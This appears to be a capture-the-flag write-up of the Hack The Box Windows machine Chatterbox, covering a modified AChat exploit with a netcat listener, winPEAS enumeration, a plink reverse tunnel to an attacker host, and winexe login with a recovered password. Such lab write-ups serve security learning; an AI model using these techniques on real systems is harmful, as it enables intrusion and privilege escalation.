# :game_die: HTB | Chatterbox. This is a Windows box. You can find it…

---

This is a Windows box. You can find it [here](https://app.hackthebox.com/machines/Chatterbox).

### Skill Learned

- Modifying publicly available exploits (MS15–051)

- Pivoting using Plink

## NMAP/ Rustscan

IP: 10.10.10.74

```
rustscan -a 10.10.10.74
```

*rustscan*

## Port 445 &139

null auth using smbmap and smbclient not working

*smbmap*

*smbclient*RPC

I’ll try to connect with null auth:

*rpclient*

Looks like we do not have permission to view users and groups:

## Port 9255 & 9256

Let’s run nmap for port 9255 and 9256

*nmap for 9255 & 9256*

Looking for Achat exploit and we found one.

*searchsploit AChat*

## Foothold/ shell

Let’s copy the exploit to our directory

*copying th exploit*

Let’s modify the msf payload from the exploit.py. We have to change the buffer from the code,

*msfvenom*

Replace the output (buff values) in exploit.py and also change the server_address to the box address

*server_address*

start `nc -nlvp 1234` and run the script.

*python exploit.py*

and boom we got the shell on our listener

*shell*

We found the user.txt

*user.txt*

## Priv Esc

Let’s copy the winpeas.exe to the box for further enumeration

*python3 -m http.server80copying the file to box*

and run it

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

We found Alfred’s password

*Alfred password*

collect systeminfo from the box and run [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

we found one CVE, Let’s take a look

*Exploit suggester*

We found [this](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/37049-32.exe) EXE for exploitation

Let’s download the exe and copy it to the box

*download the cve and start the python servercopy in box*

But it did not work 😢

*failed cve*

But what if Alfred is a user who is also an administrator but they’re just logging in as a regular account and then they provide creds when they want an administrative action? That’s actually pretty common.

Since we a credential we can think the same. But first Let’s look for internal ports

`netstat -ano`

*netstat -ano*

Let’s do port forward for 445 so we can exploit it internally

We will use [Plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) Copy the Plink.exe to the box

*python server*

*copying plink to box*

and now run plink

```
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.7
```

- This means that any connection attempt made to port 445 on the remote machine (10.10.14.7) will be forwarded to port 445 on the local machine (127.0.0.1).

For some reason, it is giving me errors

*error on plink*

It took me hours, But I found the solution, HTB blocks port 22 outbound, so we will change port 22 to port 2222 for SSH (changes are to be done in ‘/etc/ssh/sshd_config’) and restart the SSH service. Once done Let’s try again

```
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.6 -P 2222
```

*plink.exe*

to confirm the connection run `netstat -ano | grep 445` on our machine

*netstat -ano | grep 445*

Now we will connect using Welcome1!

```
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```

*winexe*

and we are administrator. We found the root.txt

*root.txt*

---
